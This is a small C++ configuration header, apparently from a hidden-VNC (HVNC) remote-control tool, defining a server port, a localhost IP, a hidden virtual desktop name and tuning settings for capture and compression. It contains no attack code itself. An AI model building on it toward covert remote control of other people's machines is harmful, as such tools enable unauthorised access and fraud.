#pragma once

#define CONNECTION_PORT "27015" // Remote server port
#define CONNECTION_IP "127.0.0.1" // Remote server ip
#define VIRTUAL_DESKTOP "hvnc" // Virtual desktop name

namespace Config {
	extern int processingSleep;
	extern int inputSleep;
	extern int qualityPercentage;
	extern int compressionPercentage;
	extern double differenceTreshold;
	extern bool enableDebug;
}
